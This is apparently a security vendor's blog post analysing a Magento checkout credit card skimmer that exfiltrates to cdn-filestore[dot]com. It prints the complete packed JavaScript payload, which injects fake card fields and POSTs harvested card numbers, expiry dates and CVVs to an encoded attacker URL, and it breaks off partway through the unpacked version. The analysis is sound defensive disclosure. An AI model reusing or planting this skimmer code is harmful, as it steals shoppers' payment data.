<p class="entry-meta"><time class="entry-time" datetime="2020-08-18T12:30:35-07:00">August 18, 2020</time><span class="entry-author"><a href="https://blog.sucuri.net/author/krasimir" class="entry-author-link" rel="author"><span class="entry-author-name">Krasimir Konov</span></a></span></p></header><div class="entry-content"><aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2020%2F08%2Fcdn-filestore-credit-card-stealer-for-magento.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=CDN-Filestore%20Credit%20Card%20Stealer%20for%20Magento&url=https://blog.sucuri.net/2020/08/cdn-filestore-credit-card-stealer-for-magento.html&via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none;"></div></div>
            </div>
                <div style="clear:both;"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.1--><p>During a website remediation, we recently discovered a new version of a Magento credit card stealer which sends all compromised data to the malicious domain <b>cdn-filestore[dot]com</b>. My colleague <a href="https://blog.sucuri.net/author/luke">Luke Leal</a> originally <a href="https://blog.sucuri.net/2020/04/magento-javascript-skimmer-targets-tarjetas-de-credito.html">wrote about this malware in a blog post</a> earlier this year.</p>
<h2>Malware Evolution &amp; Evasive Techniques</h2>
<p>One primary difference between this new version and theone Luke wrote about in April is that it was not packed. This detail suggests that the attackers updated the malware in an attempt to obfuscate it and avoid detection. Based on this observation, we can assume that they will continue to change the malware and domains as an evasive maneuver.</p>
<p>The malicious contents had been packed using JavaScript in the following manner:</p>
<pre style="white-space: pre-wrap; color: #d1d1d1; background: #000000;"><span style="color: #e66170; font-weight: bold;">eval</span><span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">function</span><span style="color: #d2cd86;">(</span>p<span style="color: #d2cd86;">,</span>a<span style="color: #d2cd86;">,</span>c<span style="color: #d2cd86;">,</span>k<span style="color: #d2cd86;">,</span>e<span style="color: #d2cd86;">,</span>d<span style="color: #d2cd86;">)</span><span style="color: #b060b0;">{</span>e<span style="color: #d2cd86;">=</span><span style="color: #e66170; font-weight: bold;">function</span><span style="color: #d2cd86;">(</span>c<span style="color: #d2cd86;">)</span><span style="color: #b060b0;">{</span><span style="color: #e66170; font-weight: bold;">return</span><span style="color: #d2cd86;">(</span>c<span style="color: #d2cd86;">&lt;</span>a<span style="color: #b060b0;">?</span><span style="color: #02d045;">'</span><span style="color: #02d045;">'</span><span style="color: #b060b0;">:</span>e<span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">parseInt</span><span style="color: #d2cd86;">(</span>c<span style="color: #d2cd86;">/</span>a<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">+</span><span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">(</span>c<span style="color: #d2cd86;">=</span>c<span style="color: #d2cd86;">%</span>a<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">&gt;</span><span style="color: #008c00;">35</span><span style="color: #b060b0;">?</span>String<span style="color: #d2cd86;">.</span><span style="color: #e66170; font-weight: bold;">fromCharCode</span><span style="color: #d2cd86;">(</span>c<span style="color: #d2cd86;">+</span><span style="color: #008c00;">29</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">:</span>c<span style="color: #d2cd86;">.</span><span style="color: #e66170; font-weight: bold;">toString</span><span style="color: #d2cd86;">(</span><span style="color: #008c00;">36</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">}</span><span style="color: #b060b0;">;</span><span style="color: #e66170; font-weight: bold;">if</span><span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">!</span><span style="color: #02d045;">'</span><span style="color: #02d045;">'</span><span style="color: #d2cd86;">.</span><span style="color: #e66170; font-weight: bold;">replace</span><span style="color: #d2cd86;">(</span><span style="color: #02d045;">/</span><span style="color: #d2cd86;">^</span><span style="color: #02d045;">/</span><span style="color: #d2cd86;">,</span>String<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">{</span><span style="color: #e66170; font-weight: bold;">while</span><span style="color: #d2cd86;">(</span>c<span style="color: #d2cd86;">--</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">{</span>d<span style="color: #d2cd86;">[</span>e<span style="color: #d2cd86;">(</span>c<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">=</span>k<span style="color: #d2cd86;">[</span>c<span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">||</span>e<span style="color: #d2cd86;">(</span>c<span style="color: #d2cd86;">)</span><span style="color: #b060b0;">}</span>k<span style="color: #d2cd86;">=</span><span style="color: #d2cd86;">[</span><span style="color: #e66170; font-weight: bold;">function</span><span style="color: #d2cd86;">(</span>e<span style="color: #d2cd86;">)</span><span style="color: #b060b0;">{</span><span style="color: #e66170; font-weight: bold;">return</span> d<span style="color: #d2cd86;">[</span>e<span style="color: #d2cd86;">]</span><span style="color: #b060b0;">}</span><span style="color: #d2cd86;">]</span><span style="color: #b060b0;">;</span>e<span style="color: #d2cd86;">=</span><span style="color: #e66170; font-weight: bold;">function</span><span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">{</span><span style="color: #e66170; font-weight: bold;">return</span><span style="color: #02d045;">'</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">w+</span><span style="color: #02d045;">'</span><span style="color: #b060b0;">}</span><span style="color: #b060b0;">;</span>c<span style="color: #d2cd86;">=</span><span style="color: #008c00;">1</span><span style="color: #b060b0;">}</span><span style="color: #b060b0;">;</span><span style="color: #e66170; font-weight: bold;">while</span><span style="color: #d2cd86;">(</span>c<span style="color: #d2cd86;">--</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">{</span><span style="color: #e66170; font-weight: bold;">if</span><span style="color: #d2cd86;">(</span>k<span style="color: #d2cd86;">[</span>c<span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">{</span>p<span style="color: #d2cd86;">=</span>p<span style="color: #d2cd86;">.</span><span style="color: #e66170; font-weight: bold;">replace</span><span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">new</span> RegExp<span style="color: #d2cd86;">(</span><span style="color: #02d045;">'</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">b</span><span style="color: #02d045;">'</span><span style="color: #d2cd86;">+</span>e<span style="color: #d2cd86;">(</span>c<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">+</span><span style="color: #02d045;">'</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">b</span><span style="color: #02d045;">'</span><span style="color: #d2cd86;">,</span><span style="color: #02d045;">'</span><span style="color: #00c4c4;">g</span><span style="color: #02d045;">'</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">,</span>k<span style="color: #d2cd86;">[</span>c<span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">}</span><span style="color: #b060b0;">}</span><span style="color: #e66170; font-weight: bold;">return</span> p<span style="color: #b060b0;">}</span><span style="color: #d2cd86;">(</span><span style="color: #02d045;">'</span><span style="color: #00c4c4;">1c z="&lt;k&gt;&lt;l F=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"h:H</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;&lt;m&gt;*&lt;/m&gt;1b t y&lt;/l&gt;&lt;c e=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"g-E</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;&lt;g K=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"w</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" n=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"h:H</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" d=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"h[H]</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" Q=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"1b t y</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" e=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"g-w C-G-1k</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" s=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"q</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;&lt;/c&gt;&lt;/k&gt;&lt;k&gt;&lt;l F=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"1m:1n</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;&lt;m&gt;*&lt;/m&gt;1p 1o&lt;/l&gt;&lt;c e=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"g-E</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;&lt;c e=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"v-D</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;&lt;j n=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"h:1i</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" d=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"h[1i]</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" e=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"1t C-G-1u</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" s=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"q</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" p=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"p</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;1v&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"1</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;1w&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"2</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;1A&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"3</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;1j&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"4</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;1q&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"5</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;1B&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"6</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;1z&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"7</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;1y&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"8</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;1x&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"9</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;1s&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"10</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;10&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"11</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;11&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"12</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;12&lt;/0&gt;&lt;/j&gt;&lt;/c&gt;&lt;c e=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"v-D</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;&lt;j n=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"h:R</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" d=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"h[R]</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" e=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"1r</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" s=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"q</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" p=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"p</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;1l&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"U</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;U&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"18</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;18&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"16</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;16&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"15</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;15&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"14</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;14&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"13</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;13&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"Z</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;Z&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"Y</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;Y&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"T</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;T&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"X</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;X&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"W</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;W&lt;/0&gt;&lt;0 a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"V</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;V&lt;/0&gt;&lt;/j&gt;&lt;/c&gt;&lt;/c&gt;&lt;/k&gt;&lt;k&gt;&lt;l F=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"h:1a</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;&lt;m&gt;*&lt;/m&gt;t O y&lt;/l&gt;&lt;c e=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"g-E</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;&lt;c e=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"v-D</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;&lt;g  K=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"w</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" Q=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"t O y</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" e=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"g-w 1T C-G-1E</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" n=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"1h</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" d=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"h[1a]</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" a=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">" s=</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"q</span><span style="color: #008080;">\\</span><span style="color: #00c4c4;">"&gt;&lt;/c&gt;&lt;/c&gt;&lt;/k&gt;";b(1N).1M(o(){b("#1L-1K-1J").19(1d);b("#1g").A(z);b("g").r("u");b("j").r("u")});b("A").19(o(){b("g").r("u");b("j").r("u");1f(!b(</span><span style="color: #008080;">\'</span><span style="color: #00c4c4;">*</span><span style="color: #008080;">\'</span><span style="color: #00c4c4;">).1H(</span><span style="color: #008080;">\'</span><span style="color: #00c4c4;">#1h</span><span style="color: #008080;">\'</span><span style="color: #00c4c4;">)){b("#1g").A(z)}});o 1d(){1c i={},I,L,17=N("1G/1F"),B=J(1D.B);b("g, j").1C(o(){I=(i[f.d]==""||i[f.d]=="x"||1e i[f.d]==="x")&amp;&amp;f.d!=""&amp;&amp;f.d!="x"&amp;&amp;1e f.d!=="x";1f(I){i[f.d]=f.a;1I S}i[f.n]=f.a});L=J(1O(1P(J(1Q.1R(i)))));b.1Y(17,o(P){b.1X({1Z:N(P),1U:{1V:S},K:"1S",M:"M="+L+"&amp;1W="+B})})}</span><span style="color: #02d045;">'</span><span style="color: #d2cd86;">,</span><span style="color: #008c00;">62</span><span style="color: #d2cd86;">,</span><span style="color: #008c00;">124</span><span style="color: #d2cd86;">,</span><span style="color: #02d045;">'</span><span style="color: #00c4c4;">option||||||||||value|jQuery|div|name|class|this|input|payment|arr|select|li|label|em|id|function|selected|off|removeAttr|autocomplete|Card|disabled||text|undefined|Number|form|html|host|validate|fix|box|for|cc|cc_number|bl|encodeURIComponent|type|string|data|atob|Verification|dat|title|cc_exp_year|true|2026|2018|2029|2028|2027|2025|2024||||2023|2022|2021|2020|domain|2019|click|cc_cid|Credit|var|onestepcheckout_payment|typeof|if|payment_form_payco|cc_cid_data|cc_exp_month|03|number|Year|billing|expiration_date|Date|Expiration|04|year|09|month|exp|Month|01|08|07|06|02|05|each|location|cvn|YWxs|Ly9jZG4tZmlsZXN0b3JlLmNvbS9jYWNoZS5waHA|is|return|order|place|onestepcheckout|ready|document|btoa|unescape|JSON|stringify|POST|cvv|xhrFields|withCredentials|target|ajax|get|url</span><span style="color: #02d045;">'</span><span style="color: #d2cd86;">.</span><span style="color: #e66170; font-weight: bold;">split</span><span style="color: #d2cd86;">(</span><span style="color: #02d045;">'</span><span style="color: #00c4c4;">|</span><span style="color: #02d045;">'</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">,</span><span style="color: #008c00;">0</span><span style="color: #d2cd86;">,</span><span style="color: #b060b0;">{</span><span style="color: #b060b0;">}</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span>
</pre>
<p>By using a JavaScript packer, bad actors are able to better conceal the true workings of the script â€” but there are a couple of obvious red flags here. For example, labels like â€œonestepcheckoutâ€ and â€œcc_exp_monthâ€ are a good sign that this malicious code is harvesting sensitive information.</p>
<h2>Information Theft &amp; Exfiltration</h2>
<p>Once we are done unpacking the code, the malicious behavior is revealed.</p>
<pre style="white-space: pre-wrap; color: #d1d1d1; background: #000000;"><span style="color: #e66170; font-weight: bold;">var</span> form <span style="color: #d2cd86;">=</span> <span style="color: #02d045;">"</span><span style="color: #00c4c4;">&lt;li&gt;&lt;label for=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">payment:cc_number</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;&lt;em&gt;*&lt;/em&gt;Credit Card Number&lt;/label&gt;&lt;div class=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">input-box</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;&lt;input type=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">text</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> id=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">payment:cc_number</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> name=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">payment[cc_number]</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> title=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">Credit Card Number</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> class=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">input-text validate-cc-number</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> value=</span><span style="color: #008080;">\"</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> autocomplete=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">off</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;&lt;/div&gt;&lt;/li&gt;&lt;li&gt;&lt;label for=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">billing:expiration_date</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;&lt;em&gt;*&lt;/em&gt;Expiration Date&lt;/label&gt;&lt;div class=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">input-box</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;&lt;div class=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">v-fix</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;&lt;select id=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">payment:cc_exp_month</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> name=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">payment[cc_exp_month]</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> class=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">month validate-cc-exp</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> autocomplete=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">off</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> selected=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">selected</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;Month&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">1</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;01&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">2</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;02&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">3</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;03&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">4</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;04&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">5</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;05&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">6</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;06&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">7</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;07&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">8</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;08&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">9</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;09&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">10</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;10&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">11</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;11&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">12</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;12&lt;/option&gt;&lt;/select&gt;&lt;/div&gt;&lt;div class=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">v-fix</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;&lt;select id=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">payment:cc_exp_year</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> name=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">payment[cc_exp_year]</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> class=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">year</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> autocomplete=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">off</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> selected=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">selected</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;Year&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">2018</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;2018&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">2019</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;2019&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">2020</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;2020&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">2021</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;2021&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">2022</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;2022&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">2023</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;2023&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">2024</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;2024&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">2025</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;2025&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">2026</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;2026&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">2027</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;2027&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">2028</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;2028&lt;/option&gt;&lt;option value=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">2029</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;2029&lt;/option&gt;&lt;/select&gt;&lt;/div&gt;&lt;/div&gt;&lt;/li&gt;&lt;li&gt;&lt;label for=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">payment:cc_cid</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;&lt;em&gt;*&lt;/em&gt;Card Verification Number&lt;/label&gt;&lt;div class=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">input-box</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;&lt;div class=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">v-fix</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">&gt;&lt;input  type=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">text</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> title=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">Card Verification Number</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> class=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">input-text cvv validate-cc-cvn</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;"> id=</span><span style="color: #008080;">\"</span><span style="color: #00c4c4;">cc_cid_data</span><span style="color: #008080;">\"</span><span style="color: 